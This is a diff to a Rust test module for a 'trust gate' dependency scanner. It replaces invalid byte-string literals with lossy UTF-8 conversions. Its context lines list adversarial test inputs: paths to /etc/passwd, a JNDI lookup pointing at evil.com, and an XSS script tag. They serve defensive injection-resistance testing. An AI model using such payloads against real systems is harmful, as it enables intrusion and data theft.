@@ -18937,7 +18937,7 @@ mod run_trust_gate_tests {
                 warnings: vec![
                     "Warning 1".to_string(),
                     "🦀".repeat(1000),
-                    "\x00\x01\xFF".repeat(100),
+                    String::from_utf8_lossy(&[0x00, 0x01, 0xFF]).repeat(100),
                 ],
                 items: (0..10000).map(|i| TrustScanItem {
                     dependency_name: format!("package_{}", i),
@@ -18970,7 +18970,7 @@ mod run_trust_gate_tests {
                 PathBuf::from("\\\\?\\C:\\"),
                 PathBuf::from("file:///etc/passwd"),
                 PathBuf::from("🦀".repeat(100)),
-                PathBuf::from("\x00\x01\xFF".repeat(10)),
+                PathBuf::from(String::from_utf8_lossy(&[0x00, 0x01, 0xFF]).repeat(10)),
             ];
 
             for (i, malicious_path) in malicious_paths.iter().enumerate() {
@@ -19374,7 +19374,7 @@ mod run_trust_gate_tests {
             // Attack 1: String field injection resistance testing
             let malicious_strings = vec![
                 "".to_string(),                                    // Empty
-                "\x00\x01\xFF".to_string(),                       // Binary data
+                String::from_utf8_lossy(&[0x00, 0x01, 0xFF]).to_string(),                       // Binary data
                 "../../etc/passwd".to_string(),                   // Path traversal
                 "${jndi:ldap://evil.com}".to_string(),           // JNDI injection
                 "<script>alert('xss')</script>".to_string(),      // XSS
